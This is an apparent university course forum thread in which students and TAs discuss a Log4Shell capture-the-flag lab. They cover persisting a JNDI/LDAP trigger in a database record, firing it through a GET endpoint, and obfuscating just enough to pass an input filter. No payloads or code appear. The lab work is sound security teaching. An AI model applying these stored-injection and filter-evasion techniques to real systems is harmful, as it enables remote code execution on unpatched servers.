I have obfuscated only just enough to bypass the teapot (I know this because I did multiple iterations of barely adding to the obfuscation). Additionally, I am using data at rest to inject the trigger and see that the exploit has been triggered based on logs. I am following the directions of what to do within the exploit. However, I am still getting the error: "Flag not obtained due to failed attempt. JDNI malicious trigger must come from data at rest." I'm not sure what I'm missing here? I have followed the directions closely and I am certain the trigger is coming from data at rest 


Reply

Keymer Botero
2d
Hey Michael! On the same page with you. This part of the writeup might help clear some confusion:

Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag.

I'd definitely recommend taking a look at what kind of call you are using.


1
Reply

Michael Ryan Boling
2d
Hey Keymer, thanks for the response! I have created the record with the POST endpoint and injected the malicious trigger to one of the fields. I then use the GET endpoint that gets products by that same field because when I do that it logs the contents of the product (meaning it logs the trigger I injected). I am now at the point where I no longer see the "must come from rest data" message, I just see the a log that the product was found, followed by its information (including the malicious trigger). However, no flag was printed. I'm a bit confused as to what's happening now because there's no more warnings but also no flag. All servers are firing, bypasses working, exploit being triggered, and I followed direction for what to do within the exploit, so really not sure what I'm missing at this point.


Reply

Sean Kenneth Weber
2d
 Replying to Michael Ryan Boling
I call the email endpoint, and the exploit is performed with data at rest. I have proven that the config.properties file is being updated as well. No clue what is going on...


1
Reply

Michael Ryan Boling
2d
 Replying to Sean Kenneth Weber
Same here, and I don't know how it could be over-obfuscation because I change one thing from when the teapot protected it to barely get it to bypass the teapot


1
Reply

Keymer Botero
15h
 Replying to Michael Ryan Boling
Wow, I’m literally doing the same thing too, but maybe there’s a way to even less obfuscation. I’ll take a look later today because I’ve followed through the same logic and still no flag.


Reply

Amrut Bhalchandra Kulkarni
6h
 Replying to Sean Kenneth Weber
I'm in the exact same situation rn
I passed my obfuscated payload into one of the fields in POST, and the email GET logs the payload, triggers the LDAP, but I get the "needs to be from data at rest" error

Other people have obtained the flag from the email endpoint, so I feel like I'm very close


Reply

Anonymous Llama
2d

Resolved
Well this was an annoying mistake, but reminder it's "jndi" not "jndp" :D


1
Reply

Kevin Darlington
2d
Ha! These errors are more common than you think! Nice work!


1
Reply

Keymer Botero
2d

Resolved
Just figured I’d repost my question here since my original post got buried I assume.

UPDATE: So close! Just got this message 

2025-03-05 03:42:44 [ProductService.java:73] WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest

I swear I feel like I'm so close but I can see why this would not be considered Data at rest since I'm TECHNICALLY using the GET to do something for me... 

The thing that confuses me is that I’m not the one technically putting it together (if TAs know what I mean), despite the warning message implying that it is.


Any advice or idea how close I actually am? Or maybe there’s something I’m perhaps overlooking. 


Reply

Keymer Botero
2d
Considering something that I'm going to test. Similar how we had to utilize the properties file before in a previous flag, I'm noticing that my product.id is not getting read when running the requests over and over. I only seeing the usual customer.service.email, topic.name, and rating. Is this related to how we should proceed?

NOTE: I am only aware that altering customer.service.email is not a requirement for this flag. 

Just noticed this part of the write-up that may have been mentioned previously but I feel its important to mention:

Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag.

EDIT: New question among my other questions:
I'm noticing my product.id getting logged multiple times. As Kevin mentioned during Office Hours, I know we need to append it as the writeup was intended to have this detail but does not at the moment. Would that be a problem though if it were logged multiple times?


Reply

Keymer Botero
2d
Just as an update to where I'm at, I found out the pattern left behind in the logs when POSTing to the server and now I also noticed a parameter when trying to trigger the LDAP call with the malicious record. 

Just to make sure I'm narrowing down my options, is that something we can leverage? I feel like I used everything I can with and still nothing. Insight/Advice would be very much appreciated in the matter.


1
Reply

Anonymous Badger
2d
are we not supposed to put the trigger in one of the fields of the POST call and then use a GET call (by that same field) to get that record?


Reply

Keymer Botero
2d
 Replying to Anonymous Badger
That's what I'm trying to do and I've performed other variations and still no luck. I swear, I feel like I've tried everything BUT the one solution that works. There's probably way more I'm not seeing but man, this flag knows how to put up a good challenge.

Been using roughly the same java payload as flag 3 & 5 and made sure to compile each time before I fire it away. 

EDIT: Just going to tune off again for work tomorrow. If anyone has any nuggets of wisdom to share, it would be greatly appreciated. Here's what I know from the writeup, comments on this thread, and from Office Hours:

Data At Rest refers to the data being stored somewhere and not actively being used. In the context of this flag, we need to stash our ldap call inside the server somehow

There's a vulnerable pattern when posting. I won't say exactly what it is but you can use it to your advantage. Be as creative as you can with it but make sure not to overdo the obfuscation.

Recall that the writeup has yet to be updated. We need to find some way to append the malicious record as 'product.id=<MALICIOUS_RECORD>' and make sure that it persists.

The customer.service.email is not relevant to this flag. As Joel mentioned, it is a red herring.

As mentioned in the hint 
"Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag." If you use the wrong call, the flag will not generate.

I know I've mentioned this a ton, but I am sincere with it, any tips/advice are massively appreciated.


1
Reply

Anonymous Badger
2d
 Replying to Keymer Botero
is the whatDoIDo also a red herring?


Reply

Keymer Botero
2d
 Replying to Anonymous Badger
I'm trying to narrow that down, so I'm not sure to be honest..😔


1
Reply

Claudia Araceli Garcia
2d
 Replying to Anonymous Badger
Also wondering the same 


3
Reply

Joel M Tucker
1d
 Replying to Keymer Botero
Between office hours and the thread, there isn't a whole lot left to give. You're close! Taking a break is a good idea when you get to stops like this


1
Reply

Matthew David Macioce
1d
 Replying to Joel M Tucker
My two cents (probably wrong) but my understanding is that it probably is a red herring because if we have to append a jndi to that variable that would not really be using data at rest, I think? I feel like we are simply (relative here lol) supposed to use one of the GETs supplied to us and that will trigger our jndi that we included in the POST when we created a new record

again, this could be off-base just my current thoughts while trying to work through this problem


Reply

Cosdyn Akers
1d
 Replying to Matthew David Macioce
I agree with this take on the parameter.  I spent a few hours playing around with it, there really isn't a good way to abuse it for our intents and purposes


1
Reply

Keymer Botero
1d
 Replying to Cosdyn Akers
Are you two sure? Because when retrieving values, it has to follow the concept of 'Data at rest'. Yes, the exploit has to come within the database, but also utilizing the suspicious parameter given and leveraging that with the pattern found when posting should theoretically perform the same Data At Rest exploit as it is something that is by the server, rather than us directly performing the needed ldap call. 

EDIT: I bring this point only because I've tried utilizing the given pattern from the POST, utilized the email endpoint described in the writeup, and the ID endpoint and still nothing. I've already posted about both errors and I can see the inner workings of both and why certain things are happening. Although the following hint mentions:

"Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag." If you use the wrong call, the flag will not generate.

Using this hint, we can narrow our search which is why I'm lead to believe this suspicious parameter is something of interest.


Reply

Rakshaa Ravishankar
1d
 Replying to Keymer Botero
I think I'm at the same place as you - my POST triggers the LDAP and I see a variable being populated with the lookup, but none of the GETS give the flag even though they spit back that value with the lookup. Isn't that what data at rest is supposed to mean, or am I wrong?


Reply

Rakshaa Ravishankar
1d
 Replying to Rakshaa Ravishankar
also, the office hour said for the data at rest error, potentially obfuscation causes an issue for it to be able to be triggered through the logs. But we do need some obfuscation in the first place for the POST to work, so that is why I am stuck.


Reply

Keymer Botero
1d
 Replying to Rakshaa Ravishankar
Noted. Perhaps there's even less obfuscation I can do. Or different way.


1
Reply

Rakshaa Ravishankar
1d
 Replying to Keymer Botero
that's what I'm looking into as well.


Reply

Matthew David Macioce
11h
 Replying to Keymer Botero
Sorry just saw this reply, Idk for certain if it's a red herring, but FWIW I was able to find the flag without using that variable 


Reply

Keymer Botero
11h
 Replying to Matthew David Macioce
Thank you so much Matthew, this is actually huge. Honestly, I feel like I understand the general concept Joel and Kevin are imparting on us regarding this flag. I think at this I need to somehow obfuscate even smaller parts of the exploit, even I'm using just enough to get past the teapot messages. I hope I can report back with something more positive but at very least, it's like the ol' saying 'It ain't over til its over.'


1
Reply

Keymer Botero
1d
I swear I'm on the edge of my seat here

2025-03-07 00:04:21 [ProductService.java:76] WARN Flag not obtained due to failed attempt. Valid product.id for product not found inin config.properties.

Just to make I'm on the same page, the product.id is just the actual ID of the product right? There's no required appended text or prefix that I am missing here? I can confirm that I am spelling 'product.id' correctly. When reversing shell connection to target, I can confirm that the format has been followed, no extra spaces and so far. Still testing but will report back when I finish checking through my results. 

EDIT: Back to the same error 😟:

2025-03-07 00:11:13 [ProductService.java:73] WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest


Reply

Keymer Botero
1d
Update: Tested what I could, nothing in my known bad actor list triggered that intriguing warning message.. I'm going to shutdown my VM client this time, rather than suspend and try again tomorrow. If anyone has something to offer with my previous questions, it would be greatly appreciated. I know I'm so close and I understand the proper assembly, but this flag man..  This post is getting really long-winded so will make a new one tomorrow if I have any more spoiler-free findings or questions.


Reply

Rakshaa Ravishankar
22h
I got the same error for valid product id not found, do you think that's further along or going backward?


Reply

Keymer Botero
12h
 Replying to Rakshaa Ravishankar
I think this error comes up when either the product.id is not appended into the config.properties file or if the product.id does not relate to a malicious record.

Just had an idea though, is the SQL behind the screens 'putting the pattern together'. The writeup mentioned using the appropriate GET endpoint but I'm trying to be as open as I can with other possibilities.


Reply

Cheng-Kai Zhang
2d

Resolved
I am kind of not sure it's me doing the wrong way or something else goes wrong...

i first use method 1 to exploit, and see the data at rest warning

Now I try to follow the author intention, fill in the way i think it want me to, through the screen I feel I do it right, but the server become extremely slow, GET and POST request need ~5 minutes to finish and my exploit didn't be triggered


Reply

Cheng-Kai Zhang
2d
interesting... finally got the flag and the frozen behavior seems due to the logic in server side. It turns out my input has minor error and once I change that it immediately run smoothly


Reply

Ashutosh Agarwal
2d
Nice work!


Reply

Shabiha Sultana Setu
3d

Resolved
I'm getting confused about the triggering process. If I send via email it says should be triggered via LADP but which parameter should I look for?


Reply

Joel M Tucker
3d
We covered Flag6 quite a bit in the office hours last night. Might help with this


1
Reply

Ramoya Grandison
2d
Has the link been posted? Not seeing it


Reply

Gantabya Kadel
3d

Resolved
I'm at a very confusing juncture. The emails I set look to be overwritten to default value when I get all the products. Then, if I try to get product by the email customerservice@gatech.edu 
the it just returns and empty []. I'm not sure what's happening here, could someone shed some light? Thanks.


Reply

Gantabya Kadel
3d
yup confirming, the email just auto changes to default regardless of what you place there.


Reply

Gantabya Kadel
3d
I have stopped and restarted the container several times but the email change doesn’t persist. I was actually able to query based on email prior to when I stopped the container first time around


Reply

Seth Hunter Hemphill
3d
 Replying to Gantabya Kadel
The email being changed might be a red herring. Post the example email they give you and see if you can query it regardless of if that example email appears different in the product list.


Reply

Joel M Tucker
3d
 Replying to Seth Hunter Hemphill
customerservice@gatech.edu is the default email that gets injected by the system. This doesn't live in the database, hence querying by it doesn't return results. 

It's a red herring for this flag


4
Reply

Gantabya Kadel
2d
 Replying to Joel M Tucker
I’m not querying by this email. 
What I’m saying is that for some reason after restarting the container my post request just does not store the email value in the db. 
And if I pull all of the records the email shown is that default email. 
I’m fairly certain that this is not expected behavior ? 


Reply

Gantabya Kadel
2d
 Replying to Gantabya Kadel
nvm I got the flag this whole question is moot. The query didn't give me anything because I forgot that email was being queried via query param and obviously encoded values change there .... 😔 


1
Reply

Gantabya Kadel
3d

Resolved
is it a good sign if I'm getting a tea pot error because the body for my post contains ip pattern ? 


Reply

Keymer Botero
3d
Keep charging forward! Use the techniques you've learned in other flags to bypass the set restrictions! (Vague due to policies!)


Reply

Maxim Olatoye
4d

Resolved
If you are stuck on 'Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest' the reason might not be obvious. I kept running into this message simply because my payload was over-obfuscated, even though it worked for previous flags. If you're facing the same problem, try using minimal obfuscation, just enough to bypass the teapot.


6
Reply

Joel M Tucker
4d
Yep. Good tip!


Reply

John Wyatt Gamble
3d
This is frustrating. I am definitely calling my exploit from data at rest but keep getting this error.


3
Reply

Sean Kenneth Weber
4d

Resolved
When fetching a single product by record ID, will leveraging query parameters work? I am leveraging query parameters, confirmed that the config file is being updated with the product ID that I am calling the GET method with, and confirmed that the config file is only being updated (not overwritten). Would the reason for this be because a query parameter does not count as "data at rest"?


Reply

Joel M Tucker
3d
You can trigger the call using several methods and strategies used in previous flags. 
But you won't get the flag unless you trigger the call from data that has been persisted (data at rest)


1
Reply

Tosin Ajayi
4d

Resolved
is this part of the log useful?

WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it.


Reply

Joel M Tucker
4d
yep, this is useful

See https://edstem.org/us/courses/69023/discussion/6222726?comment=14565084


Reply

Tosin Ajayi
4d
Thanks for your response. Just 3 follow up questions - I see a part in the task that says "You will have to inspect the logs of each of the endpoints to come up with a successful attack strategy." 
Q1: Are we to run all the 4 endpoints and inspect their logs or specific end points?
Q2: What parts of the logs should we focus on being that the logs are much?
Q3: My LDAP server is on this path /home/log4j/Desktop/log4shell/target. I wanted to be sure that it is in order?


Reply

Kevin Xia
3d
 Replying to Tosin Ajayi
1. Yes. It’s recommended to look at all of the requests and their logs.
2. Focus on the things that can be exploited; at this point on Flag6 you should be able to determine which log patterns are problematic.
3. this can be answered in the setup docs i think


Reply

Joel M Tucker
3d
 Replying to Kevin Xia
these tips ARE useful, thanks


1
Reply

Gantabya Kadel
3d
Joel, your response here is confusing. 

You had said we could ignore this warning perviously here ? 

https://edstem.org/us/courses/69023/discussion/6222726?comment=14565084

or am I just not reading this right ?


Reply

Joel M Tucker
3d
 Replying to Gantabya Kadel
hm, you're right Gantabya, my mistake. This error can be ignored.


Reply

Ramoya Grandison
5d

Resolved
Day 4 and counting…..so my Post server hits successfully, and then when i run the email endpoint the server hits, it says JNDI has to be done at data at rest. Then i go to the other get, and the server hits again but no flag - only the irrelevant error. 

What am i missing? Would the Post fire if my jndi was not done correctly?


Reply

Joel M Tucker
4d
Make sure the data at rest is correct and avoid overdoing the obfuscation.


Reply

Ramoya Grandison
4d
When you say make sure the data are rest is correct, do you mean am i getting the stored email value i set in the beginning? If so, the emails are the same


Reply

Joel M Tucker
4d
 Replying to Ramoya Grandison
I mean the call should be triggered by the data at rest, if it is not well formed it won't trigger the ldap call. Additionally, if there is too much obfuscation, it won't trigger the call


Reply

Minh Giang
4d
Think about it like this, there's something else that is presented in the logs that share something similar to your injection. Think about how you can manipulate your post data to match it.  


4
Reply

Denis Kasapovic
5d

Resolved
I just want to make sure I understand the order of things:

       1.Post to retrieve id and create payload.

       2.Then I compile the Java file? 

            a. I am testing with it compiled and I am seeing my payload

            b. I am testing not complied and getting a "foo" message.

Seems the 1st route the code runs, but there is no flag. I guess this makes sense since how would I know the product ID.  

2nd route I am unable to get to run since the code is not compiled until after I retrieve the product ID. I am leaning towards the 2nd route since the flag is supposed to be retrieved with a GET method. So, does that mean I can ignore the “foo message” and continue looking for the GET method?


Reply

Joel M Tucker
5d
I'm not completely getting the question here, but you'll need to trigger the flag with data at rest, meaning that data will need to be saved first. It will take a couple of curl calls (one POST and one GET) to get the flag


Reply

Denis Kasapovic
4d
Ok, I think I was wasting time trying to figure out why I was seeing the "reference class foo" error.  And that was due to not having the exploit compiled prior making the POST call. Seems like I can ignore and move on, and try finding the 2nd  GET call to return the flag.


Reply

Nicholas Angel Bear
5d

Resolved
Just got this flag, and it wasn't too bad! It builds on what we previously did for Flag 4 and Flag 5. I did not use obfuscation, but I did use encoding.

As many have mentioned, doing a single POST request and studying the log output helps a lot. See if there's anything that reminds you of the previous flags for constructing your payload.

Once that's done, finding the endpoint to grab your persisted data is relatively easy since we have a small set of APIs to use.


4
Reply

Ashutosh Agarwal
5d
Nice work!


Reply

Shimin Zhang
5d

Resolved
Finally solved it... If you’re stuck like I was, don’t make the same silly mistake: you need a GET request to retrieve the flag! Even if your POST triggers the exploit, the flag won’t appear until you fetch the data.


4
Reply

Kevin Darlington
5d
Nice work!


Reply

Ruangsak Patomwong
5d

Resolved
I can trigger the exploit from rest data but the flag is not generated.


Reply

Ruangsak Patomwong
5d
there is no flag generator for my expected GET endpoint but I think there is one endpoint that can trigger the data from REST


Reply

Ashutosh Agarwal
5d
You'd need to use the correct GET endpoint to generate the flag. 


1
Reply

Kevin Darlington
5d
You cannot get this flag the same way as the other flags (Using REST). You need to craft your attack in a way that when your data is retrieved from the backend it triggers the exploit. 


1
Reply

Ruangsak Patomwong
5d
Finally got the flag!!! If the script is execute when POST then don't worry, just figure how to. make it execute with the right GET endpoint.


Reply

Kevin Xia
5d

Resolved
is there a way to programmatically set the malignant product id or are we supposed to hardcode it in our java class?


Reply

Rahul Nair
5d
hardcoding will get the job done


2
Reply

Kevin Xia
5d
yup thanks, got the flag


Reply

Ramoya Grandison
5d

Resolved
I got my GET to run and trigger the server listening but it still doesn’t give the flag so I am assuming the issue is where I am injecting for post. Just to clarify, the post when successful should also trigger a 200 on the server? And outside of the Id, am I expected to include that other field in my curl? 


Reply

Kevin Darlington
5d
Yes that would be my guess. I would strongly recommend playing with the POST data with plain old strings and see how they map to the other endpoints. 


Reply

David Song Huang
5d

Resolved
I have an idea of which GET request to call to get the exploit to run, but am having trouble setting the field I need to query for this to happen. Is there any resource on how to accomplish this? The field I'm trying to set and query keeps getting reset to the default.


Reply

David Song Huang
5d
Nvm. I solved it. Hopefully this is vague enough but if you get to this step, understand how URL encoding works. 


Reply

Owen Duvall
5d

Resolved
I'm running into an issue where a certain POST request and certain GET requests are taking forever to run. Restarting the container doesn't seem to fix it, and neither does restarting the VM. I ran the top command to look at the metrics of the currently running processes, and it doesn't seem like anything is taking significant CPU or memory resources. Does anyone have any insight as to what could be going wrong here? I feel like I'm close to getting the flag, but this is making it difficult to tell.


1
Reply

Robert Morgan Gryder
5d
Are these requests running exploits? Maybe your Java code is running indefinitely/stuck in a loop and blocking the request from completing?


Reply

Owen Duvall
5d
That's the idea, but I'm not seeing any requests coming through on the LDAP server either, so I don't think the code is being run.


Reply

Joel M Tucker
5d
You can post privately with the screenshots of what you're doing. This is the second time we've heard this, could be an edge case.

The general advice, however, would be to restart the container. It could be that db connection pool is full and connection requests are timing out if you're hitting it too much


2
Reply

Owen Duvall
5d
Sounds good, thanks. I'll make a private post. 

I suspect that may not be what's happening here. Even if I restart the container, the requests I make still take a long time to execute.


Reply

Robert Perry
5d
I'm running into this issue as well.


Reply

Joel M Tucker
5d
 Replying to Robert Perry
make sure your value for price in the form data is an integer. Avoid using decimals here


3
Reply

Alexander Rodgers
4d
 Replying to Joel M Tucker
omg I was running into this issue for a while. Changing to an integer fixed it for me as well.


Reply

Le Tao
5d

Resolved
Both the POST endpoint and two of the GET endpoints (except for the sole one that throws the error: the customer.service.email property is not in config.properties or overwriting file instead of updating it) will reset config.properties file every time they are called, due to not inputing an exploit payload or doesn't match the keyword expected by the project . I verified that the file gets updated with the product.id and sets customer.service.email to example@example.com via the sole GET endpoint. I also checked in root mode with Flag2 to ensure the file isn’t reset. Then retrieved the result by email endpoint, but it only shows that the record was found.

I thought I share the same points with this useful comment:

https://edstem.org/us/courses/69023/discussion/6222726?comment=14468963

But since I didn’t capture the flag, I think I might be wrong and on the wrong track...


Reply

Joel M Tucker
5d
So this is a gap with our service. Thank you for bringing it up to our attention. 

Prior to this semester we used the /products endpoints for Flag3 but that has since moved to /cartoons endpoints. We missed removing this error logging flow. 

The error "Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties or overwriting file instead of updating it" error isn't relevant for Flag 6. You can ignore this.



4
Reply

Le Tao
5d
Thank you for clarification! The product.id triggers the flag. If the email isn’t modified in config.properties, it resets to the default email with each request except the post one. How the new added email be retrieved? (Its id is exactly the written product.id)

I also saw your reply below this comment. Perhaps I missed something. I'll have a review.

-----------

Finally captured the flag. Just a heads-up: the email in API response is a "fake" one (default email). DO NOT try to make API return the correct inserted email.


3
Reply

Ashley Tanner
5d
I definitely feel like this comment should be pinned because this error threw me for a loop for 2 days.


1
Reply

Joel M Tucker
5d
 Replying to Ashley Tanner
I can't pin comments but feel free to link if you see anyone else asking about this


Reply

Ramoya Grandison
6d

Resolved
I just have one clarifying question, for my exploit file, is the only thing being added the product.id or do we also need to add something for the email?


Reply

Ashutosh Agarwal
5d
only the product.id property needs to be added in the config.properties file.


2
Reply

Swapnanil Ray
6d

Resolved
Here's my two cents after spending a day on this:

Make sure you do a post request just to test how is it working. Understand the logs very well. What is happening to the data, that you just posted? Is something happening to it? 

Once you identify a pattern, beautifully design the payload! So much so, that this would probably be the craziest car to exist 🙏 



3
Reply

Van Hien Tran
5d
Hi, I think I got that POST part and design the payload to insert my LDAP. However, after that when I trigger with GET endpoints, nothing happened. I observed there is a GET endpoint with suspicious variable but I still don't know how it's related to the data at rest. Can you give any hint about the GET endpoint to trigger? or both will work fine if my POST payload correct?


Reply

Van Hien Tran
5d
I reached to the point when I curl the specific GET endpoint, it logged the LDAP server. However it seems not trigger it.  Any idea


Reply

Swapnanil Ray
5d
 Replying to Van Hien Tran
Your JNDI lookup worked, but the flag did not generate, is that what you mean? Are you sure, your exploit is doing what is expected from it?


Reply

Van Hien Tran
5d
 Replying to Swapnanil Ray
I mean I can see the LDAP server url got printed in the log. However, the server is not hit.

[UPDATE] i got it thanks


Reply

Amrut Bhalchandra Kulkarni
7h
This is where I'm at

Mind giving some vague sagely wisdom?


Reply

Keymer Botero
6d

Resolved
Okay, so not sure if I am missing anything but, aren't we addressing product.id? I'm receiving the following warning message:

WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it.

Last I checked according to the writeup, we were updating the product.id into there as an addition property.
Some comments are suggesting to another GET endpoint. Not sure which one yet but will report back if I find anything.
Could someone clarify this? I feel so close! 
It's really late, I'm going to hop off for now, but any intervention to clarify things would be much appreciated!


Reply

Thomas Leopold Kroll
6d
Endorsed
I wouldn't read too much into that error, I got it on a lot of my failed attempts. The endpoints they give you are all you need. 
Have you watched the office hours? It saved me from thinking too much into it


3
Reply

Keymer Botero
5d
I see, thank you for actually coming back to this thread and letting me know Thomas. I’ll check out the office hours as soon as I can and update this post ASAP after that.


Reply

Joel M Tucker
5d
You can ignore this error for Flag 6. It doesn't mean anything


Reply

Keymer Botero
3d
Thank you Joel and Thomas. I'm noticing a couple things after rewatching Office Hours 1.

After carefully inspecting rather the log, I'm seeing a new variable that I believe Minh's comment was referring to. Tried messing with that and got nowhere as there is an extra colon that I can't seem to get rid of. 

Just as additional notes, I am using as minimal Obsfucation techniques as I can and I understand that the attack should be happening on the data at rest. I am going to re-read some other posts before Office Hours 2 but any other ideas?

EDIT: Just to make sure I am understanding the directions properly, we need to overwrite the existing product.id of our malicious 'vehicle' with any id that we set ourselves? Having trouble understanding this part.


Reply

Keymer Botero
3d
 Replying to Keymer Botero
UPDATE: So close! Just got this message 

2025-03-05 03:42:44 [ProductService.java:73] WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest

I swear I feel like I'm so close but I can see why this would not be considered Data at rest since I'm TECHNICALLY using the GET to do something for me... 

The thing that confuses me is that I’m not the one technically putting it together (if TAs know what I mean).

Going to tune off for work tomorrow but any advice or idea how close I actually am? Or maybe there’s something I’m perhaps overlooking. 


Reply

David J Munoz Jr.
6d

Resolved
Just got the flag and wanted to summarize some hints that helped me to achieve this in case there are still others that are struggling.

1. Check the logs for your post request, this can provide super valuable information on proceeding with the exploit: https://edstem.org/us/courses/69023/discussion/6222726?comment=14478856

2. Construct the payload, (we've seen this in previous flags)

3. You can refer to this post for the java code: https://edstem.org/us/courses/69023/discussion/6222726?comment=14534876

4. There are many posts saying the same thing such as if you receive this email error, try the other GET endpoint. This post in particular helps when you do find the right endpoint: https://edstem.org/us/courses/69023/discussion/6222726?comment=14544550

Hope that helps without sharing too much (this post does some very vague as with most other posts providing hints) but if you stick to these points, you will be able to get the flag.


3
Reply

Anonymous Mouse
6d

Resolved
I read what other say about this property but I'm at a loss. "WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it."


Reply

Corey Cunningham
6d

Resolved
I am creating a product with an email, when I create that product the log value results in my exploit being run.

The same exploit should be run when I get the product by email due to the way things are being logged.

however when I call ?email=<the email I created> I just get an empty list, despite that the return value of when I create the product has the email I created.

I am encoding the email param query and it is showing in the logs to be what I think it should be


Reply

Corey Cunningham
6d
lol I'm so dumb, was missing a character on my email query param


Reply

Matthew Joseph Claar
6d

Resolved
Can someone add clarity as to why the LDAP call being made as soon as the initial record is created is not considered data at rest? Done with this flag, but not quite grasping why Create record --> record stored & processed --> LDAP call != restful, but record stored --> user makes query --> LDAP call IS restful. Thanks!


Reply

Jesse Lee Dotson
6d
This is just my impression from doing the assignment but I think it has to do with the fact that the exploit exists inside the system in an inactive state, ie it's "resting."

 A significant implication is that its activation can be disconnected in time from its insertion, and in our case the activation is a normal act. So if an update was made that made it impossible to successfully inject an LDAP call when creating a record, it might not prevent that exploit from executing. Or it could be laid as a trap, and execute when some specific victim does an innocuous task.


Reply

Joel M Tucker
6d
Yeah this is right. “Data at rest” refers to data that has been persisted to some form of storage (in this case a database). This is opposed to “Data in Transit” which would cover data being sent as an http request for example.

Triggering of the ldap call for most of the flags in this project would be “Data in Transit” because you are introducing a malicious payload and triggering an exploit with data in motion from an http request.

This flag focuses on the scenario of what happens when your system is logging data, not from a request coming from the outside, but from a “trusted” database? We often tend to guard the controllers and entry point layers very carefully, validating xss and http headers and params. But there can also be risk from malicious data that has already been introduced and is just sitting in storage “at rest”.


1
Reply

Thomas Leopold Kroll
7d

Resolved
I'm curious what the clerk at DMV would say if I tried to register this car. 

I agree with the other poster that the method for this one was interesting!

I don't think I have anything to add for hints, but the office hours helped to keep me from going down a crazy path.


1
Reply

Robin J Hicks
7d

Resolved
Friendly reminder: if you're confident you have everything in the right place with the right values and you're still not getting the flag, restart your container. I spent hours debugging a working exploit just to learn it was something hosed up in the lab environment. 

Also, remember the IDs do not persist a restart so you will need to re-insert your record before re-running the exploit.

Other than that annoyance, very interesting take on the exploit!


1
Reply

Reese Michael Olsen
3d
I encountered something very similar that displayed an extensive String traceback. Restarting the container worked for me. 


Reply

Robert Birk Hughes
1w

Resolved
I am having a similar issue as someone below.  I keep getting:Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest

However, this is coming from one of my curl commands at one of the GET endpoints, not the post.  The jndi lookup is correctly happening from the data that is at rest when I use the GET endpoint, and the config file properties are properly being updated.  Am I missing something here?  I don't understand the error message in my context.


Reply

Robert Birk Hughes
1w
I am 99.9% sure that I am using the correct vector and storing the exploit properly in the database.  I am getting numerous calls to my exploit script when I curl the GET endpoint and the properties is being properly updated.  Yet I still get the "must come form data at rest" error even though my exploit is coming from the data that is at rest in the database and nothing I put into the curl command


Reply

Robert Birk Hughes
1w
Finally figured it out.  <redacted> The fact my exploit was called from a GET method and did what it was supposed to do, yet not give me the flag, seems contrary to the instructions on the flag and was a massive headache, and clearly not just for me.


Reply

Joel M Tucker
1w
 Replying to Robert Birk Hughes
We'll take this feedback and see how we can make the logging more clear but still keep the spirit of the challenge. Part of the learning is understanding why obfuscation is what it is and when and how it is used.


1
Reply

Rex Kovara Belli
2d
 Replying to Joel M Tucker
Any tips here?  I'm at the same spot, and it's frustrating to be fighting the tooling and not the material.

Edit: Got it.  If you're stuck at the same spot, see comment here: https://edstem.org/us/courses/69023/discussion/6222726?comment=14472334


Reply

Brandon Shreve
1w

Resolved
The derp approach saved the day :) Thanks for the office hours!  


1
Reply

Kevin Darlington
1w
Nice work and no problem! :)


Reply

Harry Arther Staley
6d
DERP_x approach for the win.

Also logging "TOTAL PWNAGE, I LOVE IT!!!" helps me. 


1
Reply

Robert Maness
1w

Resolved
Just got this one. Personally, I think this is the coolest and most satisfying flag of the week. Thought I was insane when I noticed the attack vector, but HOLY SCHNIKES it worked. 

My tips: 

Don't worry if your email value keeps getting reset to the default - if you make the proper call searching for the one you originally set, it will still work. 

If it feels like your POST attempts are getting blocked by endless teapots, I suggest reassessing your approach. You're probably headed in the wrong direction like I was. 

Pay very close attention to the way that the logs handle your record's values as you play with each of the endpoints. There might just be a creative way you can sneak your exploit in there. 

If your code looked anything like mine for the previous flags, you should be able to get away with basically copying over your Flag 5 script and changing as little as one line. 


2
Reply

Anjali Chablani
1w
Many thanks Robert. Your tips made a difference. I got the flag. 


Reply

Ashutosh Agarwal
1w
Nice work! Thanks for sharing!


Reply

Andrew Naughton
2d
really got me over the finish line here. thanks Robert!


Reply

Jake Leggore
1w

Resolved
Hint: Find the least amount of obfuscation you can use to bypass the checkers. For some reason, too much obfuscation (even if it works) will prevent you from getting the flag.


3
Reply

J. Kendall Miller
1w

Resolved
I believe I am understanding data at rest. I have persisted the data and the trigger, and run the get request but still get. Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest


Reply

Anonymous Barracuda
1w
I have been stuck at the same point for like 4 days.


Reply

J. Kendall Miller
1w
Yah. Some people say it isn't important if the POST data insert also triggers the exploit, as long as the GET triggers it. Don't know if that is a key or not, to get the POST to not trigger and only the GET, but I don't think that is possible..


Reply

Joel M Tucker
1w
 Replying to J. Kendall Miller
The POST should not be triggering the attack. The point is for the trigger to be coming from data that has been persisted


Reply

J. Kendall Miller
1w
 Replying to Joel M Tucker
Turning off the listener will resolve that for the POST, so it doesn't trigger, and will be at rest, but issuing the GET doesn't get the flag. Same error as above.


1
Reply

J. Kendall Miller
1w
 Replying to J. Kendall Miller
I also see that some say that the exploit runs a bunch of times, but it shouldn't affect whether you get the flag, but others say that you need to keep it from running so many times. Confusing! My thought is that none of those things should be a factor in getting the flag.


Reply

J. Kendall Miller
1w
 Replying to J. Kendall Miller
Does anyone have a different process to getting the flag? Seems like I have tried everything.


Reply

Robert Birk Hughes
1w
 Replying to Joel M Tucker
My POST is not triggering the attack, only the GET, yet I am still getting the same error message as above


Reply

J. Kendall Miller
1w
 Replying to Robert Birk Hughes
So I was able to finally get the flag. This morning I spotted a pattern of where to inject my exploit. Take your time and get it right. The way I did it, my final POST request was not obfuscated, I just needed it to fit the pattern. My GET request needed URL encoding to not get an error. I hope I'm not sharing too much, but enough to help you and those that are struggling. I still think the POST request triggered the exploit, but the GET request finally gave the flag after a couple tries.


6
Reply

Linh-Dan Le
1w
 Replying to J. Kendall Miller
Second this! I didn't use any obfuscation for my post and figuring out the correct pattern was the gist of this flag. 


Reply

